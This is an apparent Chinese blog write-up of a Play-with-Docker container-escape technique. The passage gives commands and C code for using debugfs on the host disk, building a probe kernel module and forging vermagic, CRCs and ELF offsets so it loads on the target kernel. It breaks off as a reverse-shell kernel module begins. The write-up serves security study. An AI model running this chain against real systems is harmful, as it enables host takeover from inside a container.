<p>通过/proc文件系统能够获取boot image信息、root UUID，UUID与宿主root硬盘相关，下一步是定位该UUID的设备：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[node1] $ findfs UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c</span><br><span class="line">/dev/sda1</span><br></pre></td></tr></table></figure>
<p>可以尝试将其挂载，如果成功将能够接触到宿主文件系统：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[node1] $ mkdir /mnt1</span><br><span class="line">[node1] $ mount /dev/sda1 /mnt1</span><br><span class="line">mount: /mnt1: cannot mount /dev/sda1 read-only.</span><br></pre></td></tr></table></figure>

<p>无法挂载，PWD可能通过AppArmor做了限制。<br>以下是我在本机上的实验：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@6b1666dad69a:~<span class="comment"># mkdir mnt</span></span><br><span class="line">root@6b1666dad69a:~<span class="comment"># cat /proc/cmdline</span></span><br><span class="line">BOOT_IMAGE=/boot/kernel console=ttyS0 console=ttyS1 page_poison=1 vsyscall=<span class="built_in">emulate</span> panic=1 root=/dev/sr0 text</span><br><span class="line">root@6b1666dad69a:~<span class="comment"># mount /dev/sr</span></span><br><span class="line">sr0  sr1  sr2</span><br><span class="line">root@6b1666dad69a:~<span class="comment"># mount /dev/sr0 ./mnt</span></span><br><span class="line">mount: /dev/sr0 is write-protected, mounting read-only</span><br><span class="line">root@6b1666dad69a:~<span class="comment"># cd mnt/</span></span><br><span class="line">root@6b1666dad69a:~/mnt<span class="comment"># ls</span></span><br><span class="line">EFI  boot        dev  home  lib    mnt  proc  run   sendtohost  sys  usr</span><br><span class="line">bin  containers  etc  init  media  opt  root  sbin  srv         tmp  var</span><br><span class="line">root@6b1666dad69a:~/mnt<span class="comment"># ls /</span></span><br><span class="line">bin   dev  home  lib32  libx32  mnt  proc  root  sbin  sys  usr</span><br><span class="line">boot  etc  lib   lib64  media   opt  pwn   run   srv   tmp  var</span><br><span class="line">root@6b1666dad69a:~/mnt<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>再进一步推进之前，研究一下debugfs，debugfs是ext2/3/4文件系统的一个交互式调试器，它可以读写指定的ext文件系统：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[node1 $ debugfs /dev/sda1</span><br><span class="line">debugfs 1.44.2 (14-May-2018)</span><br><span class="line">debugfs:</span><br></pre></td></tr></table></figure>

<p>我们已经在sda1上渗透了主机的根文件系统。通过使用标准的Linux命令，如cd和ls，可以更深入地了解主机的文件系统：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">debugfs: ls</span><br><span class="line">2 (12) . 2 (12) .. 11 (20) lost+found 12 (12) bin</span><br><span class="line">181 (12) boot 193 (12) dev 282 (12) etc 2028 (12) home</span><br><span class="line">6847 (20) initrd.img 2030 (12) lib 4214 (16) lib64</span><br><span class="line">4216 (16) media 4217 (12) mnt 4218 (12) opt 4219 (12) proc</span><br><span class="line">4220 (12) root 4223 (12) run 4226 (12) sbin 4451 (12) snap</span><br><span class="line">4452 (12) srv 4453 (12) sys 4454 (12) tmp 4455 (12) usr</span><br><span class="line">55481 (12) var 3695 (16) vmlinuz 3529 (12) .rnd 2684 (36) -</span><br><span class="line">17685 (24) initrd.img.old 24035 (3696) vmlinuz.old</span><br></pre></td></tr></table></figure>

<p>这似乎是主机的根目录结构，每个条目前面的数字是inode，如/etc对应inode 282。<br>有了这些信息，我们可以计划下一步：</p>
<p>计划A：</p>
<ul>
<li>我们的主要目标是在宿主机上运行代码。为此我们可能会尝试加载一个Linux内核模块，该模块操纵内核来运行我们的代码。</li>
<li>要加载新的内核模块，我们通常需要使用完全相同的内核源代码、内核配置和工具集对内核模块源代码进行编译。我们无法在PWD内核上实现这一目标，因此我们转向计划B。</li>
</ul>
<p>方案B：</p>
<ul>
<li>计划B是使用已在目标内核上加载的模块来帮助我们构建自己的模块，该模块将可在PWD内核中加载。</li>
<li>有了目标模块后，我们需要编译并加载第一个“探测”内核模块，该模块将使用printk转储必要的信息，以加载第二个反向Shell模块。</li>
<li>在目标内核执行必要的代码以运行第二个模块，建立从PWD主机到我们的命令控制中心的反向shell。</li>
</ul>
<h2 id="0x01-第一阶段"><a href="#0x01-第一阶段" class="headerlink" title="0x01 第一阶段"></a>0x01 第一阶段</h2><p>借助debugfs应用程序，我们能够轻松浏览主机的文件系统。很快，我们发现了一个内核模块，该模块满足我们战术最低的要求：使用printk。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">debugfs: <span class="built_in">cd</span> /lib/modules</span><br><span class="line">debugfs: ls</span><br><span class="line">3017 (12) . 2030 (48) .. 262485 (24) 4.4.0-96-generic</span><br><span class="line">524603 (28) 4.4.0-137-generic 2055675 (3984) 4.4.0-138-generic</span><br></pre></td></tr></table></figure>

<p>这是宿主/lib/modules目录结构的列表，该目录包含3个不同的内核版本，我们需要4.4.0-96-generic。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">debugfs: <span class="built_in">cd</span> 4.4.0-96-generic/kernel/fs/ceph</span><br><span class="line">debugfs: ls</span><br><span class="line">1024182 (12) . 774089 (36) .. 1024183 (4048) ceph.ko</span><br></pre></td></tr></table></figure>

<p>接下来，提取ceph.ko，该文件是ceph软件存储平台的内核模块，主机上使用printk功能的任何其他模块都可以满足我们的要求。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">debugfs: dump &lt;1024183&gt; /tmp/ceph.ko</span><br></pre></td></tr></table></figure>

<p>dump命令实际上是通过其inode将文件从要调试的文件系统（根文件系统）提取到容器本地的/ tmp目录中。</p>
<h2 id="0x02-第二阶段-创建探针内核模块"><a href="#0x02-第二阶段-创建探针内核模块" class="headerlink" title="0x02 第二阶段 - 创建探针内核模块"></a>0x02 第二阶段 - 创建探针内核模块</h2><p>一般而言，使用一个内核源代码编译的模块不会加载在使用另一源代码编译的内核上。 但是，对于相对简单的模块，可以在三种情况下将模块加载到其他内核上：</p>
<ul>
<li>该模块正在使用内核的匹配版本。 Vermagic是一个字符串，用于标识在其上编译的内核的版本。</li>
<li>模块使用的每个函数调用或内核结构（Linux内核术语中的Symbol）在加载的时候都应向内核报告匹配的CRC。</li>
<li>模块的起始可重定位地址应与内核的编程地址一致。</li>
</ul>
<p>我们最终目标是反向Shell，这可以使用特殊的内核函数call_usermodehelper()来完成，该函数用于从内核准备和启动用户模式应用程序。但是，要加载调用此功能的模块，我们必须具有此功能的目标内核的CRC。为了获得目标内核上的call_usermodehelper()函数的CRC，我们使用一个探测模块来完成该任务。</p>
<h3 id="函数CRC"><a href="#函数CRC" class="headerlink" title="函数CRC"></a>函数CRC</h3><blockquote>
<p><a href="https://blog.csdn.net/linyt/article/details/42559639">https://blog.csdn.net/linyt/article/details/42559639</a></p>
</blockquote>
<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>解决的问题：插入模块时，内核如何判断该模块引用的内核接口已发生变化（二进制不兼容），防止模块不经重新编译就插入内核，造成系统崩溃。</p>
<p>由于内核只需要检查模块调用的接口与当前内核提供的接口，在语法和语义是否完全一致（即二进制兼容），而不需要做接口的兼容，甚至保持ABI接口不变。</p>
<p>内核做法相对简单，只做两件事情：</p>
<ol>
<li>判断内核版本是否一致，以及几个重要的配置选项情况是否相同(CONFIG_PREEMPT, CONFIG_SMP)</li>
<li>判断模块引用的导出模符号的CRC值，与当前内核该符号的CRC值是否相同</li>
</ol>
<p>只有上述两个条件满足，才能说明模块不需要重新编译。</p>
<p>CRC很直观的理解就是签名或者哈希，哪怕有一丁点的变化，它都会跳出来告诉你，有变化了，接口不匹配，请重新呼叫编译器进行工作。那么什么情况下导出符号（EXPORT_SYMBOL)不兼容，即二进制不兼容？</p>
<p>二进制接口兼容要求保持两个不变：</p>
<ul>
<li>语法保持不变</li>
</ul>
<p>遵守这个条件，说明如果模块在新内核下重新编译，那应该没有任何语法问题。即导出符号的类型名没有变化，如果是函数，则要求参数和返回值类型没有任何变化；如果这些类型是结构体的话，结构体的成员名也没有有任何变化。</p>
<ul>
<li>语义保持不变</li>
</ul>
<p>这要求符号的类型不能有变化，如果类型本身是结构体(struct)，则它成员的类型不能有变化，成员在结构体内的位置不能有变化，以及成员本身不能增删。</p>
<p>上述两点，背后朴素的道理就是：导出符号的签名不能有变化。</p>
<h4 id="内核导出符号CRC生成规则"><a href="#内核导出符号CRC生成规则" class="headerlink" title="内核导出符号CRC生成规则"></a>内核导出符号CRC生成规则</h4><p>为了将关注的重点转移到CRC的计算结构，我们做下面的简单定义字符串的CRC计算结果：</p>
<p>H(&lt;字符串&gt;, crc0):=H(&lt;子串1:末字符&gt;, crc0) = partial_crc32_one(末字符, H(&lt;子串1&gt;, crc0)）</p>
<p>这个递归定义太复杂了吧，直白地说，就是以crc0作为初值，对每个字符，都调用上述的partial_crc32_one，得到一个crc值，再将下个字符和该crc结果，调用partial_crc32_one，依次下去，直到字符串结束，得到的值就字符串的CRC值。</p>
<p>好了，有上述的约定，就可以计算每个符号的CRC值了。</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">CRC值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">int</td>
<td align="center">H(“int”, 0xffffffff) ^ 0xffffffff</td>
</tr>
<tr>
<td align="center">char</td>
<td align="center">H(“char”, 0xffffffff) ^ 0xffffffff</td>
</tr>
<tr>
<td align="center">long</td>
<td align="center">H(“long”, 0xffffffff) ^ 0xfffffff</td>
</tr>
</tbody></table>
<p>那么再复杂一点的unsigned int, unsigned long该如何计算，很简单，使用复合+偏序的计算结构，unsinged int的计算方法：</p>
<ol>
<li><p>H(“unsigned”, 0xffffffff ) -&gt; crc1</p>
</li>
<li><p>H(空白, crc1) -&gt; crc2</p>
</li>
<li><p>H(“int”, crc2) - &gt;crc3</p>
</li>
<li><p>crc3 ^ 0xfffffff -&gt; 结果</p>
</li>
</ol>
<p>为什么说是偏序呢？因此保持从左右到的计算结构，它的计算结构可以表示成：</p>
<p>0xffffffff -&gt; “unsigned” -&gt; 空白 -&gt; “int” -&gt; 0xffffffff</p>
<p>为了减少阅读的噪音，去掉空白、引号和0xffffffff，将这个表达结果简成下面这样：</p>
<p>unsigned -&gt; int</p>
<p>如 struct foo {</p>
<p>                   int a;</p>
<p>                   int b;</p>
<p>};</p>
<p>它的crc计算方式很简单，它的计算结构为：</p>
<p>struct -&gt; foo -&gt; {  -&gt; int -&gt; a -&gt; ; -&gt; int -&gt; b -&gt; ; -&gt; }</p>
<p>所以：</p>
<ul>
<li>语法属性：任保一个类型名，或者变量名发生变化，都会造成最终的CRC发生变化</li>
<li>语议属性：任何一个类型变化，或者结构成员出现位置调整，都会造成最终的CRC发生变化</li>
</ul>
<p>导出符号CRC的定义，对于通用的导出函数，只有它的类型树结构稍有点风吹草动，它的CRC就会发生变化，依赖该函数的内核模块就得重编了。</p>
<p>事实上没有这么大的恐慌，一般内核bugfix是不会造成核心数据结构的变化（一般情况，但无绝对），因此无须太担心。 一般的bugfix只是增减代码，不会修改数据结构和函数签名。</p>
<blockquote>
<p>要绕过CRC，如果确认参数兼容的话，那就把系统导出函数的CRC值，编辑进ko的CRC里面去。不是编译前，而是编译后，或者修改.mod.c，然后再手工生成ko。</p>
<p>其实参数名称发生变化，不影响调动，但根据表述的规则来看， CRC值却发生了变化。 比如： 内核导出一个函数 int fn1(int a,int b)；但是模块中引入一个函数 int fn1(int x,int y); 也就是这上下两个函数是一样的，但CRC值却不同，本可以调用，现在却不能调用了。</p>
</blockquote>
<h3 id="Step-1-Find-the-call-usermodehelper-CRC-Address-on-the-Target-Kernel"><a href="#Step-1-Find-the-call-usermodehelper-CRC-Address-on-the-Target-Kernel" class="headerlink" title="Step 1 - Find the call_usermodehelper CRC Address on the Target Kernel"></a>Step 1 - Find the call_usermodehelper CRC Address on the Target Kernel</h3><p>通过/proc/kallsyms获取符号地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[node1] $ cat /proc/kallsyms | grep call_usermod</span><br><span class="line">ffffffff81096840 T call_usermodehelper_exec</span><br><span class="line">ffffffff810969f0 t call_usermodehelper_exec_async</span><br><span class="line">ffffffff81096b40 t call_usermodehelper_exec_work</span><br><span class="line">ffffffff810970a0 T call_usermodehelper_setup</span><br><span class="line">ffffffff81097140 T call_usermodehelper</span><br><span class="line">ffffffff81d8a390 R __ksymtab_call_usermodehelper</span><br><span class="line">ffffffff81d8a3a0 R __ksymtab_call_usermodehelper_exec</span><br><span class="line">ffffffff81d8a3b0 R __ksymtab_call_usermodehelper_setup</span><br><span class="line">ffffffff81daa0e0 r __kcrctab_call_usermodehelper</span><br><span class="line">ffffffff81daa0e8 r __kcrctab_call_usermodehelper_exec</span><br><span class="line">ffffffff81daa0f0 r __kcrctab_call_usermodehelper_setup</span><br><span class="line">ffffffff81dbabf1 r __kstrtab_call_usermodehelper</span><br><span class="line">ffffffff81dbac05 r __kstrtab_call_usermodehelper_exec</span><br><span class="line">ffffffff81dbac1e r __kstrtab_call_usermodehelper_setup</span><br></pre></td></tr></table></figure>

<p>**call_usermodehelper()**函数的CRC保存在0xffffffff81daa0e0，所以我们的探针模块需要获取该处的内容：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt; /* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt; /* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt; /* Needed for the macros */</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;CyberArk Labs&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;A simple probing LKM!&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.3&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">startprobing</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// these address were copied from the kallsyms of the 4.0.0-96-generic</span></span><br><span class="line"><span class="comment">// after grepping for kcrctab_&lt;function_name&gt;</span></span><br><span class="line">  <span class="keyword">int</span> *crc1 = (<span class="keyword">int</span> *)<span class="number">0xffffffff81daa0e0</span>; <span class="comment">// address of crc of call_usermodehelper</span></span><br><span class="line">  <span class="keyword">int</span> *crc2 = (<span class="keyword">int</span> *)<span class="number">0xffffffff81dae898</span>; <span class="comment">// address of crc of printk</span></span><br><span class="line"></span><br><span class="line">  printk(KERN_EMERG <span class="string">&quot;Loading probing module...\n&quot;</span>);</span><br><span class="line">  printk(KERN_EMERG <span class="string">&quot;CRC of call_UserModeHelper = 0x%x\n&quot;</span>, *crc1);</span><br><span class="line">  printk(KERN_EMERG <span class="string">&quot;CRC of printk = 0x%x\n&quot;</span>, *crc2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">startprobing_end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_EMERG <span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(startprobing);</span><br><span class="line">module_exit(startprobing_end);</span><br></pre></td></tr></table></figure>

<h3 id="Step-2-Prepare-a-Makefile"><a href="#Step-2-Prepare-a-Makefile" class="headerlink" title="Step 2 - Prepare a Makefile"></a>Step 2 - Prepare a Makefile</h3><p>准备Makefile：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m = probing.o</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build/ M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>

<p>执行make：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make</span><br><span class="line">make -C /lib/modules/4.17.0-rc2/build/ M=/root/cprojects/kernelmod/simplemod modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/root/debian/linux-4.17-rc2&#x27;</span></span><br><span class="line">CC [M] /root/cprojects/kernelmod/simplemod/probing.o</span><br><span class="line">Building modules, stage 2.</span><br><span class="line">MODPOST 1 modules</span><br><span class="line"><span class="built_in">read</span> <span class="built_in">continue</span></span><br></pre></td></tr></table></figure>

<p>在编译器生成的文件probing.mod.c之后以及将其与探测模块的代码链接之前，我们停止了编译过程。这是自动生成的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat probing.mod.c</span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/vermagic.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/compiler.h&gt;</span></span><br><span class="line"></span><br><span class="line">MODULE_INFO(vermagic, VERMAGIC_STRING);</span><br><span class="line">MODULE_INFO(name, KBUILD_MODNAME);</span><br><span class="line"></span><br><span class="line">__visible struct module __this_module</span><br><span class="line">__attribute__((section(<span class="string">&quot;.gnu.linkonce.this_module&quot;</span>))) = &#123;</span><br><span class="line">.name = KBUILD_MODNAME,</span><br><span class="line">.init = init_module,</span><br><span class="line"><span class="comment">#ifdef CONFIG_MODULE_UNLOAD</span></span><br><span class="line">.<span class="built_in">exit</span> = cleanup_module,</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">.arch = MODULE_ARCH_INIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ifdef RETPOLINE</span></span><br><span class="line">MODULE_INFO(retpoline, <span class="string">&quot;Y&quot;</span>);</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line">static const struct modversion_info ____versions[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">&quot;__versions&quot;</span>))) = &#123;</span><br><span class="line">&#123; 0x6cb06770, __VMLINUX_SYMBOL_STR(module_layout) &#125;,</span><br><span class="line">&#123; 0x27e1a049, __VMLINUX_SYMBOL_STR(printk) &#125;,</span><br><span class="line">&#123; 0xbdfb6dbb, __VMLINUX_SYMBOL_STR(__fentry__) &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">static const char __module_depends[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">&quot;.modinfo&quot;</span>))) =</span><br><span class="line"><span class="string">&quot;depends=&quot;</span>;</span><br><span class="line"></span><br><span class="line">MODULE_INFO(srcversion, <span class="string">&quot;9757E367BD555B3C0F8A145&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Step-3-Edit-Fields-to-Match-the-Target-Kernel"><a href="#Step-3-Edit-Fields-to-Match-the-Target-Kernel" class="headerlink" title="Step 3 - Edit Fields to Match the Target Kernel"></a>Step 3 - Edit Fields to Match the Target Kernel</h3><p>我们需要替换vermagic（行6）和CRC（行26-28）来匹配目标内核，通过PWD的ceph.ko模块可以完成这个工作。我们通过modinfo从keph.ko提取内核版本和函数CRC：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ modinfo ceph.ko</span><br><span class="line"></span><br><span class="line">filename: /root/cprojects/kernelmod/play-docker/ceph.ko</span><br><span class="line">license: GPL</span><br><span class="line">description: Ceph filesystem <span class="keyword">for</span> Linux</span><br><span class="line">author: Patience Warnick &lt;patience@newdream.net&gt;</span><br><span class="line">author: Yehuda Sadeh &lt;yehuda@hq.newdream.net&gt;</span><br><span class="line">author: Sage Weil &lt;sage@newdream.net&gt;</span><br><span class="line"><span class="built_in">alias</span>: fs-ceph</span><br><span class="line">srcversion: C985B22FADB19E9D06914CC</span><br><span class="line">depends: libceph,fscache</span><br><span class="line">intree: Y</span><br><span class="line">vermagic: 4.4.0-96-generic SMP mod_unload modversions</span><br><span class="line">signat: PKCS<span class="comment">#7</span></span><br><span class="line">signer:</span><br><span class="line">sig_key:</span><br><span class="line">sig_hashalgo: md4</span><br></pre></td></tr></table></figure>

<p>抄下vermagic字符串，注意它有一个尾随的空格也应复制。我们生成的头文件需要三个CRC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module_layout, printk 和 __fentry__</span><br></pre></td></tr></table></figure>

<p>通过modprobe可以获取：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># modprobe --dump-modversions ceph.ko | grep printk</span></span><br><span class="line">0x27e1a049 printk</span><br><span class="line"><span class="comment"># modprobe --dump-modversions ceph.ko | grep module_layout</span></span><br><span class="line">0xfc5ded98 module_layout</span><br><span class="line"><span class="comment"># modprobe --dump-modversions ceph.ko | grep __fentry</span></span><br><span class="line">0xbdfb6dbb __fentry__</span><br></pre></td></tr></table></figure>

<p>编辑probing.mod.c，修改vermagic和CRC：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vermagic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/compiler.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_INFO(vermagic, <span class="string">&quot;4.4.0-96-generic SMP mod_unload modversions &quot;</span>);</span><br><span class="line">MODULE_INFO(name, KBUILD_MODNAME);</span><br><span class="line"></span><br><span class="line">__visible <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>(&quot;.<span class="title">gnu</span>.<span class="title">linkonce</span>.<span class="title">this_module</span>&quot;))) = &#123;</span></span><br><span class="line">.name = KBUILD_MODNAME,</span><br><span class="line">.init = init_module,</span><br><span class="line">#ifdef CONFIG_MODULE_UNLOAD</span><br><span class="line">.<span class="built_in">exit</span> = cleanup_module,</span><br><span class="line">#endif</span><br><span class="line">.arch = MODULE_ARCH_INIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RETPOLINE</span></span><br><span class="line">MODULE_INFO(retpoline, <span class="string">&quot;Y&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">modversion_info</span> ____<span class="title">versions</span>[]</span></span><br><span class="line"><span class="class">__<span class="title">used</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>(&quot;__<span class="title">versions</span>&quot;))) = &#123;</span></span><br><span class="line">&#123; <span class="comment">/*0x6cb06770*/</span> <span class="number">0xfc5ded98</span>, __VMLINUX_SYMBOL_STR(module_layout) &#125;,</span><br><span class="line">&#123; <span class="number">0x27e1a049</span>, __VMLINUX_SYMBOL_STR(printk) &#125;,</span><br><span class="line">&#123; <span class="number">0xbdfb6dbb</span>, __VMLINUX_SYMBOL_STR(__fentry__) &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> __module_depends[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">&quot;.modinfo&quot;</span>))) =</span><br><span class="line"><span class="string">&quot;depends=&quot;</span>;</span><br><span class="line"></span><br><span class="line">MODULE_INFO(srcversion, <span class="string">&quot;9757E367BD555B3C0F8A145&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>注意到printk和__fentry__的CRC不变，意味着远程和本地一致。</p>
<h3 id="Step-4-Change-init-module-Offset"><a href="#Step-4-Change-init-module-Offset" class="headerlink" title="Step 4 - Change init_module Offset"></a>Step 4 - Change init_module Offset</h3><p>加载探测模块之前的最后一步是更改其init_module可重定位偏移量，检查PWD内核ceph.ko模块的ELF结构init_module偏移量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -a ceph.ko | less</span><br><span class="line">...</span><br><span class="line">Relocation section <span class="string">&#x27;.rela.gnu.linkonce.this_module&#x27;</span> at offset 0x8f580 contains 2 entries:</span><br><span class="line">Offset Info Type Sym. Value Sym. Name + Addend</span><br><span class="line">000000000180 052900000001 R_X86_64_64 0000000000000000 init_module + 0</span><br><span class="line">000000000338 04e700000001 R_X86_64_64 0000000000000000 cleanup_module + 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>init_module的偏移为0x180。接下来查看探针模块init_module的偏移：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -a probing.ko | less</span><br><span class="line">...</span><br><span class="line">Relocation section <span class="string">&#x27;.rela.gnu.linkonce.this_module&#x27;</span> at offset 0x1bf18 contains 2 entries:</span><br><span class="line">Offset Info Type Sym. Value Sym. Name + Addend</span><br><span class="line">000000000178 002900000001 R_X86_64_64 0000000000000000 init_module + 0</span><br><span class="line">000000000320 002700000001 R_X86_64_64 0000000000000000 cleanup_module + 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>探测模块init_module偏移为0x178，需要对此进行更改，以便目标内核能够执行已安装模块的功能。要解决此问题，我们需要将probing.ko文件上地址0x1bf18的偏移量更改为0x180。<br>使用chngelf（作者自己的工具）进行修改：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ chngelf probing.ko 0x1bf18 0x180</span><br></pre></td></tr></table></figure>

<h3 id="Step-5-Load-the-‘Probing’-Module-to-the-Target-Kernel"><a href="#Step-5-Load-the-‘Probing’-Module-to-the-Target-Kernel" class="headerlink" title="Step 5 - Load the ‘Probing’ Module to the Target Kernel"></a>Step 5 - Load the ‘Probing’ Module to the Target Kernel</h3><p>最后一步是将probing.ko模块转移到PWD容器，然后尝试将其加载到内核：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[node1] $ insmod probing.ko</span><br></pre></td></tr></table></figure>

<p>如果加载成功不会有信息输出。接下来使用dmesg获取内核信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dmesg</span><br><span class="line">[1921106.716039] docker_gwbridge: port 67(veth4eff938) entered forwarding state</span><br><span class="line">[1921107.452064] Loading probing module...</span><br><span class="line">[1921107.456852] CRC of call_UserModeHelper = 0xc5fdef94</span><br><span class="line">[1921107.464297] CRC of printk = 0x27e1a049</span><br></pre></td></tr></table></figure>

<h2 id="0x03-第三阶段-创建反向shell模块"><a href="#0x03-第三阶段-创建反向shell模块" class="headerlink" title="0x03 第三阶段 - 创建反向shell模块"></a>0x03 第三阶段 - 创建反向shell模块</h2><p>对于反向shell，我们使用内核的函数**call_usermodehelper()**，该函数从内核准备并执行用户层应用程序。我们使用一个非常简单的模块：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @file NsEscape.c</span></span><br><span class="line"><span class="comment">* @author Nimrod Stoler, CyberArk Labs</span></span><br><span class="line"><span class="comment">* @date 29 Oct 2018</span></span><br><span class="line"><span class="comment">* @version 0.1</span></span><br><span class="line"><span class="comment">* @brief This loadable kernel module prepares a new device with</span></span><br><span class="line"><span class="comment">* the inode of mnt namespace, which allows a container to</span></span><br><span class="line"><span class="comment">* escape to the host by using enterns or setns()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt; /* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt; /* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;   /* Needed for the macros */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/nsproxy.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_ns.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The license type -- this affects runtime behavior</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The author -- visible when you use modinfo</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Nimrod Stoler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The description -- see modinfo</span></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;NS Escape LKM&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///&lt; The version of the module</span></span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span 